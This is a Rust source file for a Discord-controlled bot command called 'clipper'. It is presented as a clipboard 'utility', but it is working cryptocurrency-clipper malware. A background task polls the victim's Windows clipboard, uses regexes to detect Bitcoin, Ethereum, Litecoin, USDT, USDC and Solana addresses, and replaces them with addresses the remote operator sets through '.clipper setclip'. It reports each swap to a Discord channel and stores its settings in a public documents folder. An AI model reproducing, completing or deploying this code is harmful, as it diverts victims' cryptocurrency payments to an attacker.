use crate::commands::*;
use crate::log_debug;
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;
use clipboard_win::{get_clipboard_string, set_clipboard_string};
use once_cell::sync::Lazy;
use tokio::sync::RwLock;
use std::collections::HashMap;
use std::path::PathBuf;
use std::fs;
use std::io::{Write, BufRead, BufReader};
use regex::Regex;

const CLIPPER_DB_PATH: &str = "C:\\Users\\Public\\Documents\\clip.txt";
const CRYPTO_WARNING: &str = "please set the clipper.";

static CLIPPER_STATE: Lazy<RwLock<ClipperState>> = Lazy::new(|| {
    let mut crypto_warnings = HashMap::new();
    crypto_warnings.insert(CryptoType::BTC,  CRYPTO_WARNING.to_string());
    crypto_warnings.insert(CryptoType::ETH,  CRYPTO_WARNING.to_string());
    crypto_warnings.insert(CryptoType::LTC,  CRYPTO_WARNING.to_string());
    crypto_warnings.insert(CryptoType::USDT, CRYPTO_WARNING.to_string());
    crypto_warnings.insert(CryptoType::USDC, CRYPTO_WARNING.to_string());
    crypto_warnings.insert(CryptoType::SOL,  CRYPTO_WARNING.to_string());

    RwLock::new(ClipperState {
        is_running: false,
        rules: HashMap::new(),
        last_content: String::new(),
        crypto_warnings,
    })
});

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
enum CryptoType {
    BTC,  ETH,
    LTC,  USDT,
    USDC, SOL,
}

impl CryptoType {
    fn as_str(&self) -> &str {
        match self {
            CryptoType::BTC => "BTC",   CryptoType::ETH => "ETH",
            CryptoType::LTC => "LTC",   CryptoType::USDT => "USDT",
            CryptoType::USDC => "USDC", CryptoType::SOL => "SOL",
        }
    }

    fn from_str(s: &str) -> Option<Self> {
        match s.to_uppercase().as_str() {
            "BTC" => Some(CryptoType::BTC),   "ETH" => Some(CryptoType::ETH),
            "LTC" => Some(CryptoType::LTC),   "USDT" => Some(CryptoType::USDT),
            "USDC" => Some(CryptoType::USDC), "SOL" => Some(CryptoType::SOL),
            _ => None,
        }
    }
}

#[derive(Debug)]
struct ClipperState {
    is_running: bool,
    rules: HashMap<String, String>,
    last_content: String,
    crypto_warnings: HashMap<CryptoType, String>,
}

pub struct ClipperCommand;

#[async_trait]
impl BotCommand for ClipperCommand {
    fn name(&self) -> &str { "clipper" }
    fn description(&self) -> &str { "Monitor and replace clipboard text automatically" }
    fn category(&self) -> &str { "utility" }
    fn usage(&self) -> &str { ".clipper <on|off|add|remove|list|status|setclip|listclip>" }
    fn examples(&self) -> &'static [&'static str] {
        &[
            ".clipper on",
            ".clipper off",
            ".clipper add hi hello",
            ".clipper list",
            ".clipper remove 1",
            ".clipper setclip btc <value>",
            ".clipper listclip",
            ".clipper status",
        ]
    }
    fn aliases(&self) -> &'static [&'static str] { &["clip-auto"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let action = match args.next() {
            Some(action) => action,
            None => {
                self.show_help(http, msg).await?;
                return Ok(());
            }
        };

        match action {
            "on" | "start" => self.start_clipper(http, msg).await,
            "off" | "stop" => self.stop_clipper(http, msg).await,
            "add" => {
                let from = match args.next() {
                    Some(f) => f.to_string(),
                    None => {
                        http.create_message(msg.channel_id)
                            .content("**Error**: Usage: `.clipper add <from> <to>`")
                            .await?;
                        return Ok(());
                    }
                };
                let to = args.rest();
                if to.is_empty() {
                    http.create_message(msg.channel_id)
                        .content("**Error**: Usage: `.clipper add <from> <to>`")
                        .await?;
                    return Ok(());
                }
                self.add_rule(http, msg, &from, &to).await
            }
            "remove" | "delete" | "rm" => {
                let index_str = match args.next() {
                    Some(i) => i,
                    None => {
                        http.create_message(msg.channel_id)
                            .content("**Error**: Usage: `.clipper remove <index>`")
                            .await?;
                        return Ok(());
                    }
                };
                let index: usize = match index_str.parse() {
                    Ok(i) => i,
                    Err(_) => {
                        http.create_message(msg.channel_id)
                            .content("**Error**: Index must be a number")
                            .await?;
                        return Ok(());
                    }
                };
                self.remove_rule(http, msg, index).await
            }
            "list" | "show" => self.list_rules(http, msg).await,
            "status" => self.show_status(http, msg).await,
            "clear" => self.clear_rules(http, msg).await,
            "setclip" | "setwarning" => {
                let crypto_type = match args.next() {
                    Some(t) => t.to_string(),
                    None => {
                        http.create_message(msg.channel_id)
                            .content("**Error**: Usage: `.clipper setclip <btc|eth|ltc|usdt|usdc|sol> <text>`\n\
                                     Example: `.clipper setclip btc <value>`")
                            .await?;
                        return Ok(());
                    }
                };

                let warning = args.rest();
                if warning.is_empty() {
                    http.create_message(msg.channel_id)
                        .content("**Error**: Please provide warning text\n\
                                 Example: `.clipper setclip btc <value>`")
                        .await?;
                    return Ok(());
                }

                self.set_crypto_warning(http, msg, &crypto_type, &warning).await
            }
            "listclip" | "showcrypto" => self.list_crypto_warnings(http, msg).await,
            _ => {
                http.create_message(msg.channel_id)
                    .content(&format!(
                        "**Error**: Unknown action '{}'. Use 'on', 'off', 'add', 'remove', 'list', 'status', 'setclip', or 'listclip'",
                        action
                    ))
                    .await?;
                Ok(())
            }
        }
    }
}

impl ClipperCommand {
    async fn show_help(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let embed = twilight_util::builder::embed::EmbedBuilder::new()
            .title("Clipboard Clipper")
            .description("Automatically monitor and replace clipboard text based on rules")
            .color(0x00CED1)
            .field(twilight_model::channel::message::embed::EmbedField {
                name: "Usage".to_string(),
                value: "`.clipper <on|off|add|remove|list|status>`".to_string(),
                inline: false,
            })
            .field(twilight_model::channel::message::embed::EmbedField {
                name: "Commands".to_string(),
                value: "**on** - Start monitoring clipboard\n\
                        **off** - Stop monitoring\n\
                        **add <from> <to>** - Add replacement rule\n\
                        **remove <index>** - Remove rule by index\n\
                        **list** - Show all rules\n\
                        **clear** - Clear all rules\n\
                        **setclip <crypto> <text>** - Set crypto clipper\n\
                        **listclip** - Show all crypto clipper\n\
                        **status** - Show current status".to_string(),
                inline: false,
            })
            .field(twilight_model::channel::message::embed::EmbedField {
                name: "Examples".to_string(),
                value: "`.clipper add hi hello`\n\
                        `.clipper add btc bitcoin`\n\
                        `.clipper setclip btc <value>`\n\
                        `.clipper on`".to_string(),
                inline: false,
            })
            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new("Utility Commands"))
            .build();

        http.create_message(msg.channel_id).embeds(&[embed]).await?;
        Ok(())
    }

    async fn start_clipper(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let is_running = CLIPPER_STATE.read().await.is_running;

        if is_running {
            http.create_message(msg.channel_id)
                .content("Clipper is already running")
                .await?;
            return Ok(());
        }

        // Load rules from file
        if let Ok((loaded_rules, loaded_warnings)) = Self::load_rules_from_file() {
            let mut state = CLIPPER_STATE.write().await;

            // Load crypto warnings
            state.crypto_warnings = loaded_warnings;

            // Load rules
            if !loaded_rules.is_empty() {
                for (from, to) in loaded_rules {
                    state.rules.insert(from, to);
                }
            }
        }

        let rules_count = {
            let state = CLIPPER_STATE.read().await;
            if state.rules.is_empty() {
                drop(state);
                http.create_message(msg.channel_id)
                    .content("**Warning**: No replacement rules added. Add rules with `.clipper add <from> <to>`")
                    .await?;
                return Ok(());
            }
            state.rules.len()
        };

        {
            let mut state = CLIPPER_STATE.write().await;
            state.is_running = true;

            // Reset last_content to empty so first copy always triggers
            state.last_content = String::new();
        }

        // Start background monitoring
        let http_clone = Arc::clone(http);
        let channel_id = msg.channel_id;
        tokio::spawn(async move {
            Self::monitor_clipboard(http_clone, channel_id).await;
        });

        let embed = twilight_util::builder::embed::EmbedBuilder::new()
            .title("Clipper Started")
            .description("Clipboard monitoring is now active")
            .color(0x32CD32)
            .field(twilight_model::channel::message::embed::EmbedField {
                name: "Active Rules".to_string(),
                value: format!("{} rule(s)", rules_count),
                inline: false,
            })
            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new("Use .clipper off to stop"))
            .build();

        http.create_message(msg.channel_id).embeds(&[embed]).await?;
        Ok(())
    }

    async fn stop_clipper(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let is_running = CLIPPER_STATE.read().await.is_running;

        if !is_running {
            http.create_message(msg.channel_id)
                .content("Clipper is not running")
                .await?;
            return Ok(());
        }

        CLIPPER_STATE.write().await.is_running = false;

        let embed = twilight_util::builder::embed::EmbedBuilder::new()
            .title("Clipper Stopped")
            .description("Clipboard monitoring has been stopped")
            .color(0xFF6B6B)
            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new("Use .clipper on to restart"))
            .build();

        http.create_message(msg.channel_id).embeds(&[embed]).await?;
        Ok(())
    }

    async fn add_rule(&self, http: &Arc<HttpClient>, msg: &Message, from: &str, to: &str) -> Result<()> {
        let contains_key = CLIPPER_STATE.read().await.rules.contains_key(from);

        if contains_key {
            http.create_message(msg.channel_id)
                .content(&format!("**Warning**: Rule for '{}' already exists. Updating...", from))
                .await?;
        }

        let rules_count = {
            let mut state = CLIPPER_STATE.write().await;
            state.rules.insert(from.to_string(), to.to_string());

            // Save to file
            if let Err(e) = Self::save_rules_to_file(&state.rules, &state.crypto_warnings) {
                log_debug!("Failed to save rules to file: {}", e);
            }

            state.rules.len()
        };

        let embed = twilight_util::builder::embed::EmbedBuilder::new()
            .title("Rule Added")
            .description("New replacement rule has been added")
            .color(0x32CD32)
            .field(twilight_model::channel::message::embed::EmbedField {
                name: "From".to_string(),
                value: format!("`{}`", from),
                inline: true,
            })
            .field(twilight_model::channel::message::embed::EmbedField {
                name: "To".to_string(),
                value: format!("`{}`", to),
                inline: true,
            })
            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(
                &format!("Total rules: {}", rules_count)
            ))
            .build();

        http.create_message(msg.channel_id).embeds(&[embed]).await?;
        Ok(())
    }

    async fn remove_rule(&self, http: &Arc<HttpClient>, msg: &Message, index: usize) -> Result<()> {
        let rules_len = CLIPPER_STATE.read().await.rules.len();

        if rules_len == 0 {
            http.create_message(msg.channel_id)
                .content("No rules to remove")
                .await?;
            return Ok(());
        }

        if index == 0 || index > rules_len {
            http.create_message(msg.channel_id)
                .content(&format!("**Error**: Invalid index. Must be between 1 and {}", rules_len))
                .await?;
            return Ok(());
        }

        let (key, value, rules_count) = {
            let mut state = CLIPPER_STATE.write().await;
            let key = state.rules.keys().nth(index - 1).unwrap().clone();
            let value = state.rules.remove(&key).unwrap();

            // Save to file
            if let Err(e) = Self::save_rules_to_file(&state.rules, &state.crypto_warnings) {
                log_debug!("Failed to save rules to file: {}", e);
            }

            let rules_count = state.rules.len();
            (key, value, rules_count)
        };

        let embed = twilight_util::builder::embed::EmbedBuilder::new()
            .title("Rule Removed")
            .description(&format!("Removed: `{}` → `{}`", key, value))
            .color(0xFF6B6B)
            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(
                &format!("Remaining rules: {}", rules_count)
            ))
            .build();

        http.create_message(msg.channel_id).embeds(&[embed]).await?;
        Ok(())
    }

    async fn list_rules(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        // Load rules from file to show current saved state
        let (file_rules, file_warnings) = Self::load_rules_from_file().unwrap_or_default();

        let is_running = CLIPPER_STATE.read().await.is_running;

        if file_rules.is_empty() && file_warnings.values().all(|v| v == CRYPTO_WARNING) {
            http.create_message(msg.channel_id)
                .content("No replacement rules or crypto clipper configured.")
                .await?;
            return Ok(());
        }

        let mut rules_description = String::new();
        if !file_rules.is_empty() {
            for (i, (from, to)) in file_rules.iter().enumerate() {
                rules_description.push_str(&format!("{}. `{}` → `{}`\n", i + 1, from, to));
            }
        } else {
            rules_description = "*No text replacement rules*".to_string();
        }

        let mut crypto_description = String::new();
        let has_custom_warnings = file_warnings.values().any(|v| v != CRYPTO_WARNING);

        if has_custom_warnings {
            for crypto_type in [CryptoType::BTC, CryptoType::ETH, CryptoType::LTC, CryptoType::USDT, CryptoType::USDC, CryptoType::SOL] {
                if let Some(warning) = file_warnings.get(&crypto_type) {
                    if warning != CRYPTO_WARNING {
                        crypto_description.push_str(&format!("**{}**: `{}`\n", crypto_type.as_str(), warning));
                    }
                }
            }
        } else {
            crypto_description = "*No crypto clippers*".to_string();
        }

        let embed = twilight_util::builder::embed::EmbedBuilder::new()
            .title("Clipboard Replacement Rules")
            .description(rules_description)
            .color(0x00CED1)
            .field(twilight_model::channel::message::embed::EmbedField {
                name: "Crypto Clippers".to_string(),
                value: crypto_description,
                inline: false,
            })
            .field(twilight_model::channel::message::embed::EmbedField {
                name: "Status".to_string(),
                value: if is_running { "Running" } else { "Stopped" }.to_string(),
                inline: false,
            })
            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(
                "Use .clipper remove <index> to remove a rule | .clipper setclip <crypto> <text> to change crypto clippers"
            ))
            .build();

        http.create_message(msg.channel_id).embeds(&[embed]).await?;
        Ok(())
    }

    async fn show_status(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let (is_running, rules_count) = {
            let state = CLIPPER_STATE.read().await;
            (state.is_running, state.rules.len())
        };

        let status_text = if is_running { "Running" } else { "Stopped" };
        let color = if is_running { 0x32CD32 } else { 0xFF6B6B };

        let embed = twilight_util::builder::embed::EmbedBuilder::new()
            .title("Clipper Status")
            .color(color)
            .field(twilight_model::channel::message::embed::EmbedField {
                name: "Status".to_string(),
                value: status_text.to_string(),
                inline: true,
            })
            .field(twilight_model::channel::message::embed::EmbedField {
                name: "Rules".to_string(),
                value: format!("{} rule(s)", rules_count),
                inline: true,
            })
            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(
                "Use .clipper list to see all rules"
            ))
            .build();

        http.create_message(msg.channel_id).embeds(&[embed]).await?;
        Ok(())
    }

    async fn clear_rules(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let count = {
            let mut state = CLIPPER_STATE.write().await;
            let count = state.rules.len();
            state.rules.clear();

            // Save to file (empty)
            if let Err(e) = Self::save_rules_to_file(&state.rules, &state.crypto_warnings) {
                log_debug!("Failed to save rules to file: {}", e);
            }

            count
        };

        http.create_message(msg.channel_id)
            .content(&format!("Cleared {} rule(s)", count))
            .await?;
        Ok(())
    }

    async fn set_crypto_warning(&self, http: &Arc<HttpClient>, msg: &Message, crypto_str: &str, warning: &str) -> Result<()> {
        let crypto_type = match CryptoType::from_str(crypto_str) {
            Some(t) => t,
            None => {
                http.create_message(msg.channel_id)
                    .content(&format!(
                        "**Error**: Invalid crypto type '{}'. Valid types: btc, eth, ltc, usdt, usdc, sol",
                        crypto_str
                    ))
                    .await?;
                return Ok(());
            }
        };

        {
            let mut state = CLIPPER_STATE.write().await;
            state.crypto_warnings.insert(crypto_type, warning.to_string());

            // Save to file
            if let Err(e) = Self::save_rules_to_file(&state.rules, &state.crypto_warnings) {
                log_debug!("Failed to save rules to file: {}", e);
            }
        }

        let embed = twilight_util::builder::embed::EmbedBuilder::new()
            .title(format!("{} Warning Updated", crypto_type.as_str()))
            .description(format!("{} address warning message has been updated", crypto_type.as_str()))
            .color(0x32CD32)
            .field(twilight_model::channel::message::embed::EmbedField {
                name: "New Warning".to_string(),
                value: format!("`{}`", warning),
                inline: false,
            })
            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(
                format!("This will replace detected {} addresses", crypto_type.as_str())
            ))
            .build();

        http.create_message(msg.channel_id).embeds(&[embed]).await?;
        Ok(())
    }

    async fn list_crypto_warnings(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let warnings = {
            let state = CLIPPER_STATE.read().await;
            state.crypto_warnings.clone()
        };

        let mut description = String::new();
        for crypto_type in [CryptoType::BTC, CryptoType::ETH, CryptoType::LTC, CryptoType::USDT, CryptoType::USDC, CryptoType::SOL] {
            if let Some(warning) = warnings.get(&crypto_type) {
                description.push_str(&format!("**{}**: `{}`\n", crypto_type.as_str(), warning));
            }
        }

        let embed = twilight_util::builder::embed::EmbedBuilder::new()
            .title("Crypto Clippers")
            .description(description)
            .color(0x00CED1)
            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(
                "Use .clipper setclip <crypto> <text> to change"
            ))
            .build();

        http.create_message(msg.channel_id).embeds(&[embed]).await?;
        Ok(())
    }

    async fn monitor_clipboard(http: Arc<HttpClient>, channel_id: twilight_model::id::Id<twilight_model::id::marker::ChannelMarker>) {
        loop {
            tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;

            let should_continue = CLIPPER_STATE.read().await.is_running;

            if !should_continue {
                break;
            }

            if let Ok(current_content) = get_clipboard_string() {
                let (should_process, rules, crypto_warnings) = {
                    let state = CLIPPER_STATE.read().await;
                    let should_process = current_content != state.last_content && !current_content.is_empty();
                    (should_process, state.rules.clone(), state.crypto_warnings.clone())
                };

                if should_process {
                    let mut new_content = current_content.clone();
                    let mut replaced = false;
                    let mut replacements = Vec::new();

                    // Check for crypto addresses first (highest priority)
                    if let Some(detected_types) = Self::detect_specific_crypto(&new_content) {
                        new_content = Self::replace_specific_crypto(&new_content, &detected_types, &crypto_warnings);
                        replaced = true;

                        // Create replacement message
                        for crypto_type in &detected_types {
                            if let Some(warning) = crypto_warnings.get(crypto_type) {
                                replacements.push((format!("{} Address", crypto_type.as_str()), warning.clone()));
                            }
                        }
                    } else {
                        // Apply all regular rules
                        for (from, to) in &rules {
                            if new_content.contains(from.as_str()) {
                                new_content = new_content.replace(from, to);
                                replaced = true;
                                replacements.push((from.clone(), to.to_string()));
                            }
                        }
                    }

                    // If any replacement was made, update clipboard
                    if replaced {
                        if let Ok(_) = set_clipboard_string(&new_content) {
                            CLIPPER_STATE.write().await.last_content = new_content.clone();

                            // Send notification
                            let mut notify_msg = String::from("**Clipboard replaced:**\n");
                            for (from, to) in replacements {
                                notify_msg.push_str(&format!("`{}` → `{}`\n", from, to));
                            }

                            let _ = http.create_message(channel_id)
                                .content(&notify_msg)
                                .await;
                        }
                    } else {
                        CLIPPER_STATE.write().await.last_content = current_content;
                    }
                }
            }
        }
    }

    // Save rules to persistent storage
    fn save_rules_to_file(rules: &HashMap<String, String>, crypto_warnings: &HashMap<CryptoType, String>) -> Result<()> {
        let path = PathBuf::from(CLIPPER_DB_PATH);

        // Create directory if it doesn't exist
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent)?;
        }

        let mut file = fs::File::create(&path)?;

        // Save crypto warnings with special prefix
        for crypto_type in [CryptoType::BTC, CryptoType::ETH, CryptoType::LTC, CryptoType::USDT, CryptoType::USDC, CryptoType::SOL] {
            if let Some(warning) = crypto_warnings.get(&crypto_type) {
                writeln!(file, "[CRYPTO_{}]→{}", crypto_type.as_str(), warning)?;
            }
        }

        // Save rules
        for (from, to) in rules {
            writeln!(file, "{}→{}", from, to)?;
        }

        Ok(())
    }

    // Load rules from persistent storage
    fn load_rules_from_file() -> Result<(HashMap<String, String>, HashMap<CryptoType, String>)> {
        let path = PathBuf::from(CLIPPER_DB_PATH);

        let mut crypto_warnings = HashMap::new();
        crypto_warnings.insert(CryptoType::BTC, CRYPTO_WARNING.to_string());
        crypto_warnings.insert(CryptoType::ETH, CRYPTO_WARNING.to_string());
        crypto_warnings.insert(CryptoType::LTC, CRYPTO_WARNING.to_string());
        crypto_warnings.insert(CryptoType::USDT, CRYPTO_WARNING.to_string());
        crypto_warnings.insert(CryptoType::USDC, CRYPTO_WARNING.to_string());
        crypto_warnings.insert(CryptoType::SOL, CRYPTO_WARNING.to_string());

        if !path.exists() {
            return Ok((HashMap::new(), crypto_warnings));
        }

        let file = fs::File::open(&path)?;
        let reader = BufReader::new(file);
        let mut rules = HashMap::new();

        for line in reader.lines() {
            if let Ok(line) = line {
                let line = line.trim();
                if line.is_empty() {
                    continue;
                }

                if let Some((from, to)) = line.split_once('→') {
                    // Check if this is a crypto warning line
                    if from.starts_with("[CRYPTO_") && from.ends_with("]") {
                        // Extract crypto type: [CRYPTO_BTC] -> BTC
                        let crypto_str = from.trim_start_matches("[CRYPTO_").trim_end_matches("]");
                        if let Some(crypto_type) = CryptoType::from_str(crypto_str) {
                            crypto_warnings.insert(crypto_type, to.to_string());
                        }
                    } else if from == "[CRYPTO_WARNING]" || from == "[BTC_WARNING]" {
                        // Support old format
                        for crypto_type in [CryptoType::BTC, CryptoType::ETH, CryptoType::LTC, CryptoType::USDT, CryptoType::USDC, CryptoType::SOL] {
                            crypto_warnings.insert(crypto_type, to.to_string());
                        }
                    } else {
                        rules.insert(from.to_string(), to.to_string());
                    }
                }
            }
        }

        Ok((rules, crypto_warnings))
    }

    // Detect specific cryptocurrency types in text
    fn detect_specific_crypto(text: &str) -> Option<Vec<CryptoType>> {
        let mut detected = Vec::new();

        // Bitcoin patterns
        let btc_legacy = Regex::new(r"\b1[a-km-zA-HJ-NP-Z1-9]{25,34}\b").unwrap();
        let btc_p2sh = Regex::new(r"\b3[a-km-zA-HJ-NP-Z1-9]{25,34}\b").unwrap();
        let btc_bech32 = Regex::new(r"\bbc1[a-z0-9]{39,87}\b").unwrap();

        let has_btc = btc_legacy.is_match(text) || btc_p2sh.is_match(text) || btc_bech32.is_match(text);
        if has_btc {
            detected.push(CryptoType::BTC);
        }

        // Litecoin (specific prefix L/M)
        let ltc_legacy = Regex::new(r"\b[LM][a-km-zA-HJ-NP-Z1-9]{26,34}\b").unwrap();
        let ltc_bech32 = Regex::new(r"\bltc1[a-z0-9]{39,87}\b").unwrap();
        let has_ltc = ltc_legacy.is_match(text) || ltc_bech32.is_match(text);
        if has_ltc {
            detected.push(CryptoType::LTC);
        }

        // Ethereum / ERC-20 (ETH, USDT, USDC) very specific 0x prefix
        let eth = Regex::new(r"\b0x[a-fA-F0-9]{40}\b").unwrap();
        if eth.is_match(text) {
            // ETH addresses are shared with USDT and USDC
            detected.push(CryptoType::ETH);
            detected.push(CryptoType::USDT);
            detected.push(CryptoType::USDC);
        }

        // Solana, only check if no BTC or LTC detected (they share Base58 encoding)
        // SOL addresses are typically 43-44 chars, rarely 32-34 like BTC
        if !has_btc && !has_ltc {
            let sol = Regex::new(r"\b[1-9A-HJ-NP-Za-km-z]{43,44}\b").unwrap();
            if sol.is_match(text) {
                detected.push(CryptoType::SOL);
            }
        }

        if detected.is_empty() {
            None
        } else {
            Some(detected)
        }
    }

    // Replace cryptocurrency addresses with their specific warnings
    fn replace_specific_crypto(text: &str, detected_types: &[CryptoType], crypto_warnings: &HashMap<CryptoType, String>) -> String {
        let mut result = text.to_string();

        // Replace Bitcoin addresses
        if detected_types.contains(&CryptoType::BTC) {
            if let Some(warning) = crypto_warnings.get(&CryptoType::BTC) {
                let btc_legacy = Regex::new(r"\b1[a-km-zA-HJ-NP-Z1-9]{25,34}\b").unwrap();
                let btc_p2sh = Regex::new(r"\b3[a-km-zA-HJ-NP-Z1-9]{25,34}\b").unwrap();
                let btc_bech32 = Regex::new(r"\bbc1[a-z0-9]{39,87}\b").unwrap();

                result = btc_legacy.replace_all(&result, warning.as_str()).to_string();
                result = btc_p2sh.replace_all(&result, warning.as_str()).to_string();
                result = btc_bech32.replace_all(&result, warning.as_str()).to_string();
            }
        }

        // Replace Ethereum/ERC-20 addresses (use ETH warning for now, could be USDT/USDC too)
        if detected_types.contains(&CryptoType::ETH) {
            if let Some(warning) = crypto_warnings.get(&CryptoType::ETH) {
                let eth = Regex::new(r"\b0x[a-fA-F0-9]{40}\b").unwrap();
                result = eth.replace_all(&result, warning.as_str()).to_string();
            }
        }

        // Replace Litecoin addresses
        if detected_types.contains(&CryptoType::LTC) {
            if let Some(warning) = crypto_warnings.get(&CryptoType::LTC) {
                let ltc_legacy = Regex::new(r"\b[LM][a-km-zA-HJ-NP-Z1-9]{26,34}\b").unwrap();
                let ltc_bech32 = Regex::new(r"\bltc1[a-z0-9]{39,87}\b").unwrap();

                result = ltc_legacy.replace_all(&result, warning.as_str()).to_string();
                result = ltc_bech32.replace_all(&result, warning.as_str()).to_string();
            }
        }

        // Replace Solana addresses
        if detected_types.contains(&CryptoType::SOL) {
            if let Some(warning) = crypto_warnings.get(&CryptoType::SOL) {
                let sol = Regex::new(r"\b[1-9A-HJ-NP-Za-km-z]{32,44}\b").unwrap();
                result = sol.replace_all(&result, warning.as_str()).to_string();
            }
        }

        result
    }
}
